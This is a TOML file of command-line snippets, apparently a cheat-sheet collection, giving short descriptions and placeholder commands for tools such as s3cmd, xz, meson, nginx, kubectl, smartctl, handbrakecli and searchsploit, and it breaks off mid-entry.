  description = "Read a PNM image as input and produce a JPEG/JFIF/EXIF image as output"
  command = "pnmtojpeg <path/to/file.pnm> > <path/to/file.jpg>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pnmtojpeg -version"
  output = ""

[[snippets]]
  description = "Process input with tables, saving the output for future typesetting with groff to PostScript"
  command = "tbl <path/to/input_file> > <path/to/output.roff>"
  output = ""

[[snippets]]
  description = "Typeset input with tables to PDF using the [me] macro package"
  command = "tbl -T <pdf> <path/to/input.tbl> | groff -<me> -T <pdf> > <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Invoke configuration/reconfiguration tool"
  command = "s3cmd --configure"
  output = ""

[[snippets]]
  description = "List Buckets/Folders/Objects"
  command = "s3cmd ls s3://<bucket|path/to/file>"
  output = ""

[[snippets]]
  description = "Create Bucket/Folder"
  command = "s3cmd mb s3://<bucket>"
  output = ""

[[snippets]]
  description = "Download a specific file from a bucket"
  command = "s3cmd get s3://<bucket_name>/<path/to/file> <path/to/local_file>"
  output = ""

[[snippets]]
  description = "Upload a file to a bucket"
  command = "s3cmd put <local_file> s3://<bucket>/<file>"
  output = ""

[[snippets]]
  description = "Move an object to a specific bucket location"
  command = "s3cmd mv s3://<src_bucket>/<src_object> s3://<dst_bucket>/<dst_object>"
  output = ""

[[snippets]]
  description = "Delete a specific object"
  command = "s3cmd rm s3://<bucket>/<object>"
  output = ""

[[snippets]]
  description = "Compress a file using xz"
  command = "xz <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress an xz file"
  command = "xz --decompress <path/to/file.xz>"
  output = ""

[[snippets]]
  description = "Compress a file using lzma"
  command = "xz --format=lzma <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress an lzma file"
  command = "xz --decompress --format=lzma <path/to/file.lzma>"
  output = ""

[[snippets]]
  description = "Decompress a file and write to `stdout` (implies `--keep`)"
  command = "xz --decompress --stdout <path/to/file.xz>"
  output = ""

[[snippets]]
  description = "Compress a file, but don't delete the original"
  command = "xz --keep <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a file using the fastest compression"
  command = "xz -0 <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a file using the best compression"
  command = "xz -9 <path/to/file>"
  output = ""

[[snippets]]
  description = "Cancel current job on the default printer"
  command = "lprm"
  output = ""

[[snippets]]
  description = "Cancel a job of a specific server"
  command = "lprm -h <server[:port]> <job_id>"
  output = ""

[[snippets]]
  description = "Cancel multiple jobs with a encrypted connection to the server"
  command = "lprm -E <job_id1 job_id2 ...>"
  output = ""

[[snippets]]
  description = "Cancel all jobs"
  command = "lprm -"
  output = ""

[[snippets]]
  description = "Cancel the current job of a specific printer or class"
  command = "lprm -P <destination[/instance]>"
  output = ""

[[snippets]]
  description = "Ask GPT to improve the code with no extra options"
  command = "rgpt --i ""$(git diff <path/to/file>)"""
  output = ""

[[snippets]]
  description = "Get a more detailed verbose output from `rgpt` while reviewing the code"
  command = "rgpt --v --i ""$(git diff <path/to/file>)"""
  output = ""

[[snippets]]
  description = "Ask GPT to improve the code and limit it to a certain amount of GPT3 tokens"
  command = "rgpt --max <300> --i ""$(git diff <path/to/file>)"""
  output = ""

[[snippets]]
  description = "Ask GPT for a more unique result using a float value between 0 and 2. (higher = more unique)"
  command = "rgpt --pres <1.2> --i ""$(git diff <path/to/file>)"""
  output = ""

[[snippets]]
  description = "Ask GPT to review your code using a specific model"
  command = "rgpt --model <davinci> --i ""$(git diff <path/to/file>)"""
  output = ""

[[snippets]]
  description = "Make `rgpt` use a JSON output"
  command = "rgpt --json --i ""$(git diff <path/to/file>)"""
  output = ""

[[snippets]]
  description = "Check the style of a single file"
  command = "pycodestyle <file.py>"
  output = ""

[[snippets]]
  description = "Check the style of multiple files"
  command = "pycodestyle <file1.py file2.py ...>"
  output = ""

[[snippets]]
  description = "Show only the first occurrence of an error"
  command = "pycodestyle --first <file.py>"
  output = ""

[[snippets]]
  description = "Show the source code for each error"
  command = "pycodestyle --show-source <file.py>"
  output = ""

[[snippets]]
  description = "Show the specific PEP 8 text for each error"
  command = "pycodestyle --show-pep8 <file.py>"
  output = ""

[[snippets]]
  description = "Launch a presentation in the terminal from a Markdown file"
  command = "mdp <presentation.md>"
  output = ""

[[snippets]]
  description = "Disable fading transitions"
  command = "mdp --nofade <presentation.md>"
  output = ""

[[snippets]]
  description = "Invert font colors to use in terminals with light background"
  command = "mdp --invert <presentation.md>"
  output = ""

[[snippets]]
  description = "Disable transparency in transparent terminals"
  command = "mdp --notrans <presentation.md>"
  output = ""

[[snippets]]
  description = "Parse and check a file for errors"
  command = "wat2wasm <file.wat>"
  output = ""

[[snippets]]
  description = "Write the output binary to a given file"
  command = "wat2wasm <file.wat> -o <file.wasm>"
  output = ""

[[snippets]]
  description = "Display simplified representation of every byte"
  command = "wat2wasm -v <file.wat>"
  output = ""

[[snippets]]
  description = "Compile a .NET project in release mode"
  command = "dotnet publish --configuration Release <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Publish the .NET Core runtime with your application for the specified runtime"
  command = "dotnet publish --self-contained true --runtime <runtime_identifier> <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Package the application into a platform-specific single-file executable"
  command = "dotnet publish --runtime <runtime_identifier> -p:PublishSingleFile=true <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Trim unused libraries to reduce the deployment size of an application"
  command = "dotnet publish --self-contained true --runtime <runtime_identifier> -p:PublishTrimmed=true <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Compile a .NET project without restoring dependencies"
  command = "dotnet publish --no-restore <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Specify the output directory"
  command = "dotnet publish --output <path/to/directory> <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Watch the source for changes and run `rsync` to synchronize files to the destination on every change"
  command = "lsyncd -rsync <path/to/source> <host::share_name>"
  output = ""

[[snippets]]
  description = "Use SSH instead of `rsyncd` shares"
  command = "lsyncd -rsyncssh <path/to/source> <host> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Compile a PDF document"
  command = "pdflatex <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document specifying an output directory"
  command = "pdflatex -output-directory=<path/to/directory> <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document, exiting on each error"
  command = "pdflatex -halt-on-error <source.tex>"
  output = ""

[[snippets]]
  description = "Start `skim` on all files in the specified directory"
  command = "find <path/to/directory> -type f | sk"
  output = ""

[[snippets]]
  description = "Start `skim` for running processes"
  command = "ps aux | sk"
  output = ""

[[snippets]]
  description = "Start `skim` with a specified query"
  command = "sk --query ""<query>"""
  output = ""

[[snippets]]
  description = "Select multiple files with `Shift + Tab` and write to a file"
  command = "find <path/to/directory> -type f | sk --multi > <path/to/file>"
  output = ""

[[snippets]]
  description = "Build a project (assuming only one `*.gpr` file exists in the current directory)"
  command = "gprbuild"
  output = ""

[[snippets]]
  description = "Build a specific [P]roject file"
  command = "gprbuild -P<project_name>"
  output = ""

[[snippets]]
  description = "Clean up the build workspace"
  command = "gprclean"
  output = ""

[[snippets]]
  description = "Install compiled binaries"
  command = "gprinstall --prefix <path/to/installation/dir>"
  output = ""

[[snippets]]
  description = "View the comments on a `zip` archive"
  command = "zipnote <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Extract the comments on a `zip` archive to a file"
  command = "zipnote <path/to/file.zip> > <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Add/Update comments in a `zip` archive from a file"
  command = "zipnote -w <path/to/file.zip> < <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Generate a C project with a given name and version"
  command = "meson init --language=<c> --name=<myproject> --version=<0.1>"
  output = ""

[[snippets]]
  description = "Configure the `builddir` with default values"
  command = "meson setup <build_dir>"
  output = ""

[[snippets]]
  description = "Build the project"
  command = "meson compile -C <path/to/build_dir>"
  output = ""

[[snippets]]
  description = "Run all tests in the project"
  command = "meson test"
  output = ""

[[snippets]]
  description = "Show the help"
  command = "meson --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "meson --version"
  output = ""

[[snippets]]
  description = "Initialize a new Behat project"
  command = "behat --init"
  output = ""

[[snippets]]
  description = "Run all tests"
  command = "behat"
  output = ""

[[snippets]]
  description = "Run all tests from the specified suite"
  command = "behat --suite=<suite_name>"
  output = ""

[[snippets]]
  description = "Run tests with a specific output formatter"
  command = "behat --format <pretty|progress>"
  output = ""

[[snippets]]
  description = "Run tests and output results to a file"
  command = "behat --out <path/to/file>"
  output = ""

[[snippets]]
  description = "List the definitions in your test suites"
  command = "behat --definitions"
  output = ""

[[snippets]]
  description = "Apply a patch using a diff file (filenames must be included in the diff file)"
  command = "patch < <patch.diff>"
  output = ""

[[snippets]]
  description = "Apply a patch to a specific file"
  command = "patch <path/to/file> < <patch.diff>"
  output = ""

[[snippets]]
  description = "Patch a file writing the result to a different file"
  command = "patch <path/to/input_file> -o <path/to/output_file> < <patch.diff>"
  output = ""

[[snippets]]
  description = "Apply a patch to the current directory"
  command = "patch -p1 < <patch.diff>"
  output = ""

[[snippets]]
  description = "Apply the reverse of a patch"
  command = "patch -R < <patch.diff>"
  output = ""

[[snippets]]
  description = "Start recording in file named "typescript""
  command = "script"
  output = ""

[[snippets]]
  description = "Stop recording"
  command = "exit"
  output = ""

[[snippets]]
  description = "Start recording in a given file"
  command = "script <logfile.log>"
  output = ""

[[snippets]]
  description = "Append to an existing file"
  command = "script -a <logfile.log>"
  output = ""

[[snippets]]
  description = "Execute quietly without start and done messages"
  command = "script -q <logfile.log>"
  output = ""

[[snippets]]
  description = "Bundle all plugins for static loading"
  command = "antibody bundle < <~/.zsh_plugins.txt> > <~/.zsh_plugins.sh>"
  output = ""

[[snippets]]
  description = "Update all bundles"
  command = "antibody update"
  output = ""

[[snippets]]
  description = "List all installed plugins"
  command = "antibody list"
  output = ""

[[snippets]]
  description = "List all JVM processes"
  command = "jps"
  output = ""

[[snippets]]
  description = "List all JVM processes with only PID"
  command = "jps -q"
  output = ""

[[snippets]]
  description = "Display the arguments passed to the processes"
  command = "jps -m"
  output = ""

[[snippets]]
  description = "Display the full package name of all processes"
  command = "jps -l"
  output = ""

[[snippets]]
  description = "Display the arguments passed to the JVM"
  command = "jps -v"
  output = ""

[[snippets]]
  description = "Start a single-node etcd cluster"
  command = "etcd"
  output = ""

[[snippets]]
  description = "Start a single-node etcd cluster, listening for client requests on a custom URL"
  command = "etcd --advertise-client-urls <http://127.0.0.1:1234> --listen-client-urls <http://127.0.0.1:1234>"
  output = ""

[[snippets]]
  description = "Start a single-node etcd cluster with a custom name"
  command = "etcd --name <my_etcd_cluster>"
  output = ""

[[snippets]]
  description = "Start a single-node etcd cluster with extensive metrics available at <http://localhost:2379/debug/pprof/>"
  command = "etcd --enable-pprof --metrics extensive"
  output = ""

[[snippets]]
  description = "Get the list of libraries and their dependencies"
  command = "pkg-config --libs <library1 library2 ...>"
  output = ""

[[snippets]]
  description = "Get the list of libraries, their dependencies, and proper cflags for gcc"
  command = "pkg-config --cflags --libs <library1 library2 ...>"
  output = ""

[[snippets]]
  description = "Compile your code with libgtk-3, libwebkit2gtk-4.0 and all their dependencies"
  command = "c++ example.cpp $(pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.0) -o example"
  output = ""

[[snippets]]
  description = "Delete the configuration for the storage pool specified name or UUID (determine using `virsh pool-list`)"
  command = "virsh pool-undefine --pool <name|uuid>"
  output = ""

[[snippets]]
  description = "Generate a certificate signing request to be sent to a certificate authority"
  command = "openssl req -new -sha256 -key <filename.key> -out <filename.csr>"
  output = ""

[[snippets]]
  description = "Generate a self-signed certificate and a corresponding key-pair, storing both in a file"
  command = "openssl req -new -x509 -newkey <rsa>:<4096> -keyout <filename.key> -out <filename.cert> -subj ""</C=XX/CN=foobar>"" -days <365>"
  output = ""

[[snippets]]
  description = "Manage a cluster using a kubeconfig context"
  command = "k9s --context <kubeconfig_context_name>"
  output = ""

[[snippets]]
  description = "Manage a cluster in read-only mode (disabling all commands that may cause modifications)"
  command = "k9s --readonly --cluster <cluster_name>"
  output = ""

[[snippets]]
  description = "Manage a cluster using a given kubernetes namespace"
  command = "k9s --namespace <kubernetes_namespace> --cluster <cluster_name>"
  output = ""

[[snippets]]
  description = "Manage a cluster launching k9s in the pod view and enable debug logging"
  command = "k9s --command <pod> --logLevel debug --cluster <cluster_name>"
  output = ""

[[snippets]]
  description = "Stream the largest media file in a torrent"
  command = "peerflix ""<torrent_url|magnet_link>"""
  output = ""

[[snippets]]
  description = "List all streamable files contained in a torrent (given as a magnet link)"
  command = "peerflix ""<magnet:?xt=urn:btih:0123456789abcdef0123456789abcdef01234567>"" --list"
  output = ""

[[snippets]]
  description = "Stream the largest file in a torrent, given as a torrent URL, to VLC"
  command = "peerflix ""<http://example.net/music.torrent>"" --vlc"
  output = ""

[[snippets]]
  description = "Stream the largest file in a torrent to MPlayer, with subtitles"
  command = "peerflix ""<torrent_url|magnet_link>"" --mplayer --subtitles <subtitle-file.srt>"
  output = ""

[[snippets]]
  description = "Stream all files from a torrent to Airplay"
  command = "peerflix ""<torrent_url|magnet_link>"" --all --airplay"
  output = ""

[[snippets]]
  description = "Compile a source file"
  command = "ocamlopt -o <path/to/binary> <path/to/source_file.ml>"
  output = ""

[[snippets]]
  description = "Compile with debugging enabled"
  command = "ocamlopt -g -o <path/to/binary> <path/to/source_file.ml>"
  output = ""

[[snippets]]
  description = "Start server with the default configuration file"
  command = "nginx"
  output = ""

[[snippets]]
  description = "Start server with a custom configuration file"
  command = "nginx -c <configuration_file>"
  output = ""

[[snippets]]
  description = "Start server with a prefix for all relative paths in the configuration file"
  command = "nginx -c <configuration_file> -p <prefix/for/relative/paths>"
  output = ""

[[snippets]]
  description = "Test the configuration without affecting the running server"
  command = "nginx -t"
  output = ""

[[snippets]]
  description = "Reload the configuration by sending a signal with no downtime"
  command = "nginx -s reload"
  output = ""

[[snippets]]
  description = "Start tunnel from a specific port"
  command = "lt --port <8000>"
  output = ""

[[snippets]]
  description = "Specify the upstream server doing the forwarding"
  command = "lt --port <8000> --host <host>"
  output = ""

[[snippets]]
  description = "Request a specific subdomain"
  command = "lt --port <8000> --subdomain <subdomain>"
  output = ""

[[snippets]]
  description = "Print basic request info"
  command = "lt --port <8000> --print-requests"
  output = ""

[[snippets]]
  description = "Open the tunnel URL in the default web browser"
  command = "lt --port <8000> --open"
  output = ""

[[snippets]]
  description = "Smooth out a PNM image using a convolution matrix of size 3x3"
  command = "pnmsmooth <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Smooth out a PNM image using a convolution matrix of size width times height"
  command = "pnmsmooth -width <width> -height <height> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Reformat all `.scala` files in the current directory recursively"
  command = "scalafmt"
  output = ""

[[snippets]]
  description = "Reformat specific files or directories with a custom formatting configuration"
  command = "scalafmt --config <path/to/.scalafmt.conf> <path/to/file_or_directory> <path/to/file_or_directory> <...>"
  output = ""

[[snippets]]
  description = "Check if files are correctly formatted, returning `0` if all files respect the formatting style"
  command = "scalafmt --config <path/to/.scalafmt.conf> --test"
  output = ""

[[snippets]]
  description = "Exclude files or directories"
  command = "scalafmt --exclude <path/to/file_or_directory> <...>"
  output = ""

[[snippets]]
  description = "Format only files that were edited against the current Git branch"
  command = "scalafmt --config <path/to/.scalafmt.conf> --mode diff"
  output = ""

[[snippets]]
  description = "Format an XML document, indenting with tabs"
  command = "xml format --indent-tab <path/to/input.xml|URI> > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Format an HTML document, indenting with 4 spaces"
  command = "xml format --html --indent-spaces <4> <path/to/input.html|URI> > <path/to/output.html>"
  output = ""

[[snippets]]
  description = "Recover parsable parts of a malformed XML document, without indenting"
  command = "xml format --recover --noindent <path/to/malformed.xml|URI> > <path/to/recovered.xml>"
  output = ""

[[snippets]]
  description = "Format an XML document from `stdin`, removing the `DOCTYPE` declaration"
  command = "cat <path\to\input.xml> | xml format --dropdtd > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Format an XML document, omitting the XML declaration"
  command = "xml format --omit-decl <path\to\input.xml|URI> > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml format --help"
  output = ""

[[snippets]]
  description = "Terminate a process using the default SIGTERM (terminate) signal"
  command = "killall <process_name>"
  output = ""

[[snippets]]
  description = "[l]ist available signal names (to be used without the 'SIG' prefix)"
  command = "killall -l"
  output = ""

[[snippets]]
  description = "Interactively ask for confirmation before termination"
  command = "killall -i <process_name>"
  output = ""

[[snippets]]
  description = "Terminate a process using the SIGINT (interrupt) signal, which is the same signal sent by pressing `Ctrl + C`"
  command = "killall -INT <process_name>"
  output = ""

[[snippets]]
  description = "Force kill a process"
  command = "killall -KILL <process_name>"
  output = ""

[[snippets]]
  description = "Start an interactive session"
  command = "iex"
  output = ""

[[snippets]]
  description = "Start a session that remembers history"
  command = "iex --erl ""-kernel shell_history enabled"""
  output = ""

[[snippets]]
  description = "Start and load Mix project files"
  command = "iex -S mix"
  output = ""

[[snippets]]
  description = "Collect garbage, i.e. remove unused paths to reduce space usage"
  command = "nix store gc"
  output = ""

[[snippets]]
  description = "Hard-link identical files together to reduce space usage"
  command = "nix store optimise"
  output = ""

[[snippets]]
  description = "Delete a specific store path (most be unused)"
  command = "nix store delete </nix/store/...>"
  output = ""

[[snippets]]
  description = "List a contents of the store path, on a remote store"
  command = "nix store --store <https://cache.nixos.org> ls </nix/store/...>"
  output = ""

[[snippets]]
  description = "Show the differences in versions between two store paths, with their respective dependencies"
  command = "nix store diff-closures </nix/store/...> </nix/store/...>"
  output = ""

[[snippets]]
  description = "Print a full list of committers to `stdout` instead of to the `AUTHORS` file"
  command = "git authors --list"
  output = ""

[[snippets]]
  description = "Append the list of committers to the `AUTHORS` file and open it in the default editor"
  command = "git authors"
  output = ""

[[snippets]]
  description = "Append the list of committers, excluding emails, to the `AUTHORS` file and open it in the default editor"
  command = "git authors --no-email"
  output = ""

[[snippets]]
  description = "Check directories for duplicated, empty and broken files"
  command = "rmlint <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Check for space wasters, preferably keeping files in tagged directories (after the double slash)"
  command = "rmlint <path/to/directory> // <path/to/original_directory>"
  output = ""

[[snippets]]
  description = "Check for space wasters, keeping everything in the untagged directories"
  command = "rmlint --keep-all-untagged <path/to/directory> // <path/to/original_directory>"
  output = ""

[[snippets]]
  description = "Delete duplicate files found by an execution of `rmlint`"
  command = "./rmlint.sh"
  output = ""

[[snippets]]
  description = "Find duplicate directory trees"
  command = "rmlint --merge-directories <path/to/directory>"
  output = ""

[[snippets]]
  description = "Mark files at lower path [d]epth as originals, on tie choose shorter [l]ength"
  command = "rmlint --rank-by=<dl> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Find only duplicates that have the same filename in addition to the same contents"
  command = "rmlint --match-basename <path/to/directory>"
  output = ""

[[snippets]]
  description = "Find only duplicates that have the same extension in addition to the same contents"
  command = "rmlint --match-extension <path/to/directory>"
  output = ""

[[snippets]]
  description = "Add credentials to the secure keystore"
  command = "aws-vault add <profile>"
  output = ""

[[snippets]]
  description = "Execute a command with AWS credentials in the environment"
  command = "aws-vault exec <profile> -- <aws s3 ls>"
  output = ""

[[snippets]]
  description = "Open a browser window and login to the AWS Console"
  command = "aws-vault login <profile>"
  output = ""

[[snippets]]
  description = "List profiles, along with their credentials and sessions"
  command = "aws-vault list"
  output = ""

[[snippets]]
  description = "Rotate AWS credentials"
  command = "aws-vault rotate <profile>"
  output = ""

[[snippets]]
  description = "Remove credentials from the secure keystore"
  command = "aws-vault remove <profile>"
  output = ""

[[snippets]]
  description = "Open thunderbird"
  command = "thunderbird"
  output = ""

[[snippets]]
  description = "Use a specific user profile"
  command = "thunderbird -P <profile_name>"
  output = ""

[[snippets]]
  description = "Use a specific user profile directory"
  command = "thunderbird --profile <path/to/profile/directory>"
  output = ""

[[snippets]]
  description = "Delete a specific pod"
  command = "kubectl delete pod <pod_name>"
  output = ""

[[snippets]]
  description = "Delete a specific deployment"
  command = "kubectl delete deployment <deployment_name>"
  output = ""

[[snippets]]
  description = "Delete a specific node"
  command = "kubectl delete node <node_name>"
  output = ""

[[snippets]]
  description = "Delete all pods in a specified namespace"
  command = "kubectl delete pods --all --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Delete all deployments and services in a specified namespace"
  command = "kubectl delete deployments,services --all --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Delete all nodes"
  command = "kubectl delete nodes --all"
  output = ""

[[snippets]]
  description = "Delete resources defined in a YAML manifest"
  command = "kubectl delete --filename <path/to/manifest.yaml>"
  output = ""

[[snippets]]
  description = "Display SMART health summary"
  command = "sudo smartctl --health </dev/sdX>"
  output = ""

[[snippets]]
  description = "Display device information"
  command = "sudo smartctl --info </dev/sdX>"
  output = ""

[[snippets]]
  description = "Start a short self-test in the background"
  command = "sudo smartctl --test short </dev/sdX>"
  output = ""

[[snippets]]
  description = "Display current/last self-test status and other SMART capabilities"
  command = "sudo smartctl --capabilities </dev/sdX>"
  output = ""

[[snippets]]
  description = "Display exhaustive SMART data"
  command = "sudo smartctl --all </dev/sdX>"
  output = ""

[[snippets]]
  description = "List all available boards"
  command = "pio boards"
  output = ""

[[snippets]]
  description = "List only boards from installed platforms"
  command = "pio boards --installed"
  output = ""

[[snippets]]
  description = "Convert a PPM file to an HP PaintJet file"
  command = "ppmtopj <path/to/input.ppm> > <path/to/output.pj>"
  output = ""

[[snippets]]
  description = "Move the image in the x and y direction"
  command = "ppmtopj -xpos <dx> -ypos <dy> <path/to/input.ppm> > <path/to/output.pj>"
  output = ""

[[snippets]]
  description = "Explicitly specify a gamma value"
  command = "ppmtopj -gamma <gamma> <path/to/input.ppm> > <path/to/output.pj>"
  output = ""

[[snippets]]
  description = "Stop a storage pool specified by name or UUID (determine using `virsh pool-list`)"
  command = "virsh pool-destroy --pool <name|uuid>"
  output = ""

[[snippets]]
  description = "Create a xar archive of all files in a given directory"
  command = "xar -cf <archive.xar> <path/to/directory>"
  output = ""

[[snippets]]
  description = "List the contents of a given xar archive"
  command = "xar -tf <archive.xar>"
  output = ""

[[snippets]]
  description = "Extract the contents of a given xar archive to the current directory"
  command = "xar -xf <archive.xar>"
  output = ""

[[snippets]]
  description = "Show events for today and tomorrow (or the weekend on Friday) from the default calendar"
  command = "calendar"
  output = ""

[[snippets]]
  description = "Look [A]head, showing events for the next 30 days"
  command = "calendar -A <30>"
  output = ""

[[snippets]]
  description = "Look [B]ack, showing events for the previous 7 days"
  command = "calendar -B <7>"
  output = ""

[[snippets]]
  description = "Show events from a custom calendar [f]ile"
  command = "calendar -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Start running a file forever (as a daemon)"
  command = "forever <script>"
  output = ""

[[snippets]]
  description = "List running "forever" processes (along with IDs and other details of "forever" processes)"
  command = "forever list"
  output = ""

[[snippets]]
  description = "Stop a running "forever" process"
  command = "forever stop <ID|pid|script>"
  output = ""

[[snippets]]
  description = "Move files using a regular expression-like pattern"
  command = "zmv '<(*).log>' '<$1.txt>'"
  output = ""

[[snippets]]
  description = "Preview the result of a move, without making any actual changes"
  command = "zmv -n '<(*).log>' '<$1.txt>'"
  output = ""

[[snippets]]
  description = "Interactively move files, with a prompt before every change"
  command = "zmv -i '<(*).log>' '<$1.txt>'"
  output = ""

[[snippets]]
  description = "Verbosely print each action as it's being executed"
  command = "zmv -v '<(*).log>' '<$1.txt>'"
  output = ""

[[snippets]]
  description = "Generate a PGM image containing white noise"
  command = "pbmnoise <width> <height> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Specify the seed for the pseudo-random number generator"
  command = "pbmnoise <width> <height> -randomseed <value> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Specify the desired rate of white to black pixels"
  command = "pbmnoise <width> <height> -ratio <1/3> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Add an article to the RSS feed"
  command = "sup <path/to/file.html>"
  output = ""

[[snippets]]
  description = "Format a specific Snakefile"
  command = "snakefmt <path/to/snakefile>"
  output = ""

[[snippets]]
  description = "Format all Snakefiles recursively in a specific directory"
  command = "snakefmt <path/to/directory>"
  output = ""

[[snippets]]
  description = "Format a file using a specific configuration file"
  command = "snakefmt --config <path/to/config.toml> <path/to/snakefile>"
  output = ""

[[snippets]]
  description = "Format a file using a specific maximum line length"
  command = "snakefmt --line-length <100> <path/to/snakefile>"
  output = ""

[[snippets]]
  description = "Display the changes that would be performed without performing them (dry-run)"
  command = "snakefmt --diff <path/to/snakefile>"
  output = ""

[[snippets]]
  description = "Convert an image to PDF (Note: Specifying an output filename is optional)"
  command = "a2ping <path/to/image.ext> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Compress the document using the specified method"
  command = "a2ping --nocompress <none|zip|best|flate> <path/to/file>"
  output = ""

[[snippets]]
  description = "Scan HiResBoundingBox if present (defaults to yes)"
  command = "a2ping --nohires <path/to/file>"
  output = ""

[[snippets]]
  description = "Allow page content below and left of the origin (defaults to no)"
  command = "a2ping --below <path/to/file>"
  output = ""

[[snippets]]
  description = "Pass extra arguments to `gs`"
  command = "a2ping --gsextra <arguments> <path/to/file>"
  output = ""

[[snippets]]
  description = "Pass extra arguments to external program (i.e `pdftops`)"
  command = "a2ping --extra <arguments> <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "a2ping -h"
  output = ""

[[snippets]]
  description = "Print a specific word definition"
  command = "mate-dictionary --no-window --look-up '<word>'"
  output = ""

[[snippets]]
  description = "Show similar words for a specific one in a new window"
  command = "mate-dictionary --match '<word>'"
  output = ""

[[snippets]]
  description = "Clear the terminal screen"
  command = "wipeclean"
  output = ""

[[snippets]]
  description = "Set the animation speed in frames per second (defaults to 150)"
  command = "wipeclean --speed <speed>"
  output = ""

[[snippets]]
  description = "Open the front page"
  command = "/front"
  output = ""

[[snippets]]
  description = "Open a subreddit"
  command = "/r/<subreddit_name>"
  output = ""

[[snippets]]
  description = "Expand/collapse comments"
  command = "[space]"
  output = ""

[[snippets]]
  description = "Open link"
  command = "o"
  output = ""

[[snippets]]
  description = "Log in"
  command = "u"
  output = ""

[[snippets]]
  description = "Display help"
  command = "?"
  output = ""

[[snippets]]
  description = "Convert an SGI image to a PNM file"
  command = "sgitopnm <path/to/input.sgi> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Display information about the SGI file"
  command = "sgitopnm -verbose <path/to/input.sgi> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Extract channel n of the SGI file"
  command = "sgitopnm -channel <n> <path/to/input.sgi> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Convert a video file to MKV (AAC 160kbit audio and x264 CRF20 video)"
  command = "handbrakecli --input <input.avi> --output <output.mkv> --encoder x264 --quality 20 --ab 160"
  output = ""

[[snippets]]
  description = "Resize a video file to 320x240"
  command = "handbrakecli --input <input.mp4> --output <output.mp4> --width 320 --height 240"
  output = ""

[[snippets]]
  description = "List available presets"
  command = "handbrakecli --preset-list"
  output = ""

[[snippets]]
  description = "Convert an AVI video to MP4 using the Android preset"
  command = "handbrakecli --preset=""Android"" --input <input.ext> --output <output.mp4>"
  output = ""

[[snippets]]
  description = "Print the content of a DVD, getting the CSS keys in the process"
  command = "handbrakecli --input </dev/sr0> --title 0"
  output = ""

[[snippets]]
  description = "Rip the first track of a DVD in the specified device. Audiotracks and subtitle languages are specified as lists"
  command = "handbrakecli --input </dev/sr0> --title 1 --output <out.mkv> --format av_mkv --encoder x264 --subtitle <1,4,5> --audio <1,2> --aencoder copy --quality <23>"
  output = ""

[[snippets]]
  description = "Wait for a process to finish given its process ID (PID) and return its exit status"
  command = "wait <pid>"
  output = ""

[[snippets]]
  description = "Wait for all processes known to the invoking shell to finish"
  command = "wait"
  output = ""

[[snippets]]
  description = "Build Caddy server from source"
  command = "xcaddy build"
  output = ""

[[snippets]]
  description = "Build Caddy server with a specific version (defaults to latest)"
  command = "xcaddy build <version>"
  output = ""

[[snippets]]
  description = "Build Caddy with a specific module"
  command = "xcaddy build --with <module_name>"
  output = ""

[[snippets]]
  description = "Build Caddy and output to a specific file"
  command = "xcaddy build --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Build and run Caddy for a development plugin in the current directory"
  command = "xcaddy run"
  output = ""

[[snippets]]
  description = "Build and run Caddy for a development plugin using a specific Caddy config"
  command = "xcaddy run --config <path/to/file>"
  output = ""

[[snippets]]
  description = "Compile a source file"
  command = "nim compile <path/to/file.nim>"
  output = ""

[[snippets]]
  description = "Compile and run a source file"
  command = "nim compile -r <path/to/file.nim>"
  output = ""

[[snippets]]
  description = "Compile a source file with release optimizations enabled"
  command = "nim compile -d:release <path/to/file.nim>"
  output = ""

[[snippets]]
  description = "Build a release binary optimized for low file size"
  command = "nim compile -d:release --opt:size <path/to/file.nim>"
  output = ""

[[snippets]]
  description = "Generate HTML documentation for a module (output will be placed in the current directory)"
  command = "nim doc <path/to/file.nim>"
  output = ""

[[snippets]]
  description = "Check a file for syntax and semantics"
  command = "nim check <path/to/file.nim>"
  output = ""

[[snippets]]
  description = "Show the current version of Azure CLI modules and extensions in JSON format"
  command = "az version"
  output = ""

[[snippets]]
  description = "Show the current version of Azure CLI modules and extensions in a given format"
  command = "az version --output <json|table|tsv>"
  output = ""

[[snippets]]
  description = "Search for an exploit, shellcode, or paper"
  command = "searchsploit <search_terms>"
  output = ""

[[snippets]]
  description = "Search for a known specific version, e.g. sudo version 1.8.27"
  command = "searchsploit sudo 1.8.27"
  output = ""

[[snippets]]
  description = "Show the exploit-db link to the found resources"
